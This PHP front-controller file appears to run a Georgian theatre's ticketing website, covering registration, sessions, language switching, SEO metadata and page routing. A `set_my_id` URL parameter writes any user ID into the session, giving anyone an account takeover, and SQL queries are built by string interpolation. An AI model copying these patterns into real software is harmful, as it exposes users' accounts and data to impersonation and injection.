        //echo "registracia dasrulda carmatebit";
        echo "<script>document.location.href='?reg_succ=1';</script>";
        $url = "http://teatri.ge/"; 
        $mp5['body']="<br/> <br/> კეთილი იყოს თქვენი მობრძანება თეატრში. <br/><br/>ამიერიდან შეგიძლია შეიძინო ბილეთები თეატრის ვებგვერდის საშუალებით";
        $mp5['buy']="<a href=$url target='_blank'; style='color:#141414; width: 300px;text-decoration: none; line-height:40px ; display: block; font-family: Arial, Helvetica, sans-serif; font-size: 20px; background-color:#CABEA3 '>ბილეთის შეძენა</a>";
        
        $body=load_template("mailer",$mp5);
        Send_Mail2($body,$email,"წარმატებული რეგისტრაცია");

        $url = "href='http://teatri.ge/'";
        $message = "კეთილი იყოს თქვენი მობრძანება თეატრში. ამიერიდან შეგიძლია შეიძინო ბილეთები თეატრის ვებგვერდის საშუალებით - http://teatri.ge/";

        $destination = $phone;
        $response = $senderGe->sendSms(1, $destination, $message);

    }
    
    }       
    exit;
}


if (!isset($_SESSION["user_id"])){
    $logged=0;
    
    $m0["header_login"]=load_template("header_login");
} else {
    $logged=1;
    $user_id=hack_check($_SESSION["user_id"]);
    $q="SELECT fbid FROM users WHERE id='$user_id'";
    
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    if (mysqli_num_rows($r)>0){
        $fbid=mr($r, 0, "fbid");
        if ($fbid==""){$fbid=0;}
    }
  
    $m0["header_login"]=load_template("logged_in");
}


if (isset($_GET["set_my_id"]) ){
    $_SESSION["user_id"]=hack_check($_GET["set_my_id"]);
    $user_id=hack_check($_GET["set_my_id"]);
    echo "<script>document.location.href='?';</script>";
    exit;
}
// --------------------------- Social links, chahardkodebuli statiaa da masze mibmuli failebi aris linkebi
//$m0["facebook_page"]=get_file(1190, 101);
//$m0["twitter"]=get_file(1190, 102);
//$m0["youtube_channel"]=get_file(1190, 103);
//$m0["instagram"]=get_file(1190, 104);

$cmenu="home";
if(isset($_GET["m"])){$cmenu=hard_hack_check($_GET["m"]);}

if($lang == 1){
    $meta_name = 'მულტიფუნქციური სივრცე ღონისძიებებისთვის | "თეატრი"';
    $meta_desc = 'მიიღეთ უნიკალური გამოცდილება ახალ მულტიფუნქციურ სივრცე "თეატრში", სადაც აღმოაჩენთ როგორც ამერიკული მიუზიკლების გრანდიოზულ გაცოცხლებას, ასევე ქართული ტრადიციული თემატიკის აღმაფრთოვანებელ დადგმებს.';
}
else{
    $meta_name = 'Multifunctional Space for Events in Tbilisi, Georgia | "Theatre"';
    $meta_desc = 'Get a unique experience in the new multi-functional space "Theatre", where you will find both grand revivals of American musicals and exciting stagings of Georgian traditional shows.';
}


$m1["meta_name"]=$meta_name;
$m1["meta_description"]=$meta_desc;


if (isset($_GET["m"])){
    $m_lang=hack_check($_GET["m"]);
    if($m_lang=="en"){ 
    $lang=2;
    $cmenu="home";}
}


if($lang==1){
    $m0["l_lang"]="?";
    $m0["h_lang"]="ge";
    $m1["h_lang"]="ge";
    $m2["h_lang"]="ge";
    $m3["h_lang"]="ge";
    $m4["h_lang"]="ge";
    $m5["h_lang"]="ge";
    $m33["h_lang"]="ge";
}else{
    $m0["l_lang"]="en";
    $m0["h_lang"]="en";
    $m1["h_lang"]="en";
    $m2["h_lang"]="en";
    $m3["h_lang"]="en";
    $m4["h_lang"]="en";
    $m5["h_lang"]="en";
    $m33["h_lang"]="en";
}

include "menu_top.php";

$m0["language_changer"]="";
$logo=331;
$r=mysqli_query($conn, "SELECT logo, lname, sname, flag_image,id FROM langs WHERE status='1' ORDER BY id ASC") or die(mysqli_error($conn));
if (mysqli_num_rows($r)>1){
    for ($i=0;$i<mysqli_num_rows($r);$i++){
        $id=mr($r, $i, "id");
        $m33["lname"]=mr($r, $i, "lname");
        $m33["sname"]=mr($r, $i, "sname");
        $m33["lang_id"]=$id;
        if ($lang==$id){
            $m33["isactive"]="header-language-active";
            $m33["display"]="none";
            $logo=mr($r, $i, "logo");
        } else {$m33["isactive"]="";
            $m33["display"]="inlineblock";
        }
        $lang_flag=mr($r, $i, "flag_image");
        $m33["lang_flag"]=get_file(0, 1,$lang_flag);
        
        $uri = $_GET;
        $base_url = $_SERVER['REQUEST_URI'];
        $parsed_url = parse_url($base_url);  // Parse the URL to get its components

        if ($lang == 1) {
            // Append '/en' before the query parameters
            $m33['url'] = rtrim($parsed_url['path'], '/') . '/en';
            if (isset($parsed_url['query'])) {
                $m33['url'] .= '?' . $parsed_url['query'];
            }
        } elseif ($lang == 2) {
            // Remove '/en' from the URL if it exists, but keep trailing /
            $m33['url'] = preg_replace('//en$/', '/', $parsed_url['path']);
            if (isset($parsed_url['query'])) {
                $m33['url'] .= '?' . $parsed_url['query'];
            }
        } else {
            // Keep the URL as is for other lang values
            $m33['url'] = $base_url;
        }


        $m0["language_changer"].=load_template("lang_but_item",$m33);

        
    }
}


include "menu_bot.php";


$m0["lang_1_display"]="none";
$m0["lang_2_display"]="none";
$m0["lang_".$lang."_display"]="inline";


$m1["header"]=load_template("header", $m0);
$m1["footer"]=load_template("footer", $m0);


$fb_image="/images/main-fb.png";
$str["s_month_0"]="";

$fb_text=str_replace('"',"",$str["s_main_title"]);
$fb_site_desc=str_replace('"',"",$str["s_main_title"]);
$site_title=str_replace('"',"",$str["s_main_title"]);



$fb_url=$main_domain.$lang_names[$lang];

$english_schema = array(
    "@context" => "http://schema.org",
    "@type" => "Organization",
    "name" => "Theatre",
    "url" => "https://teatri.ge/",
    "telephone" => "+995 577 00 08 88",
    "address" => array(
      "@type" => "PostalAddress",
      "streetAddress" => "99 beliashvili street",
      "addressLocality" => "Tbilisi",
      "addressCountry" => "Georgia"
    ),
    "sameAs" => array(
      "https://www.facebook.com/theatretsiskvili",
      "https://www.instagram.com/theatre__teatri"
    )
    );

    $georgian_schema = array(
    "@context" => "http://schema.org",
    "@type" => "Organization",
    "name" => "თეატრი",
    "url" => "https://teatri.ge/",
    "telephone" => "+995 577 00 08 88",
    "address" => array(
        "@type" => "PostalAddress",
        "streetAddress" => "ბელიაშვილის 99",
        "addressLocality" => "თბილისი",
        "addressCountry" => "საქართველო"
    ),
    "sameAs" => array(
        "https://www.facebook.com/theatretsiskvili",
        "https://www.instagram.com/theatre__teatri"
    )
    );

    $website_schema = array(
    "@context" => "http://schema.org",
    "@type" => "WebSite",
    "name" => "Teatri",
    "url" => "https://teatri.ge/"
    );


    $localbusiness_schema = array(
        "@context" => "http://schema.org",
        "@type" => "LocalBusiness",
        "name" => "Theatre",
        "url" => "https://teatri.ge/",
        "telephone" => "+995 577 00 08 88",
        "address" => array(
        "@type" => "PostalAddress",
        "streetAddress" => "99 beliashvili street",
        "addressLocality" => "Tbilisi",
        "addressCountry" => "Georgia"
        ),
        "sameAs" => array(
        "https://www.facebook.com/theatretsiskvili",
        "https://www.instagram.com/theatre__teatri"
        )
    );
    $localbusiness_schema_json = json_encode($localbusiness_schema,  JSON_PRETTY_PRINT  | JSON_UNESCAPED_UNICODE);
    $m1["contdata"] = '<script type="application/ld+json">' . $localbusiness_schema_json . '</script>';
    $m1["articledata"]="";$m1["eventdata"] = "";
    $website_schema_json = json_encode($website_schema,  JSON_PRETTY_PRINT  | JSON_UNESCAPED_UNICODE);
    $m1["webbdata"] = '<script type="application/ld+json">' . $website_schema_json . '</script>';
    if($lang==1){$schema = $georgian_schema;}else{$schema = $english_schema;}
    $m1["orgdata"] = json_encode($schema,  JSON_PRETTY_PRINT  | JSON_UNESCAPED_UNICODE);
    $m1["orggdata"] = '<script type="application/ld+json">' . $m1["orgdata"] . '</script>';



if($cmenu!="home"){

    $found=0;

    $q="SELECT id FROM articles WHERE cat='10' and front_id='$cmenu' and pid='0' LIMIT 1";


    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    
    if (mysqli_num_rows($r)>0 or $cmenu=="articles" or $cmenu=="about_us" or $cmenu=="aup" or $cmenu=="privacy" or $cmenu=="profile"or $cmenu=="booking" or $cmenu=="invoice" or $cmenu=="booking_2"){
        if($cmenu != 'contacts'){
        $m1["contdata"] = "";
        $m1["orggdata"] = "";}
        $found=1;
    }else {  
        $hack_attempt = load_template("../404");
        echo $hack_attempt;
        exit;
    }
}
else{
    $m1["contdata"] = "";
}


$debug=0;
if (isset($_GET["debug"])){$debug=1;}
$m1["erbooking"]="none";

$m1["menu_items"]="";

include $cmenu.".php";

$m1["additional"]="";
if($logged==0){
    $m1["additional"].=load_template("reg");
    $m1["additional"].=load_template("login",$m5);
    $m1["additional"].=load_template("reset_pw_1",$m5);
    $m1["additional"].=load_template("reset_pw_2",$m5);
    $m1["additional"].=load_template("error",$m5);


} elseif (isset($_GET["reg_succ"])){
    $m1["additional"].=load_template("reg_success");

}
$m1["additional"].=load_template("error_1",$m5);
$m1["additional"].=load_template("error_2",$m5);

if($lang == 2){
if (strpos($fb_url, '/en') === false) {
    // Check if the URL ends with a slash
    if (substr($fb_url, -1) !== '/') {
        $fb_url .= '/';
    }
    // Add '/en' to the URL
    $fb_url .= 'en';
}
}


$breadcrumbListJSON = json_encode($breadcrumbList, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
$m1["breadcrumbList"]='<script type="application/ld+json">' . $breadcrumbListJSON . '</script>';

$m1["fb_text"]=str_replace('"',"",$fb_text);
$m1["fb_url"]=$fb_url;
$m1["fb_link"]=$fb_url;

$m1["fb_url_encoded"]=urlencode($fb_url);
$m1["fb_image"]=$fb_image;
$m1["fb_site_desc"]=$fb_site_desc;
$m1["site_title"]=str_replace('"',"",$site_title);

$m1["cur_lang"]=$lang;
$m1["date_created"]=$json_date;

$m1["logged_in"]=$user_id;
$m1["fb_login_id"]=$fbid;


$m1["meta_name"]=$meta_name;
$m1["meta_description"]=$meta_desc;

$html=load_template("index",$m1);
$html=replace_strings($html, $str);

echo $html;


?>
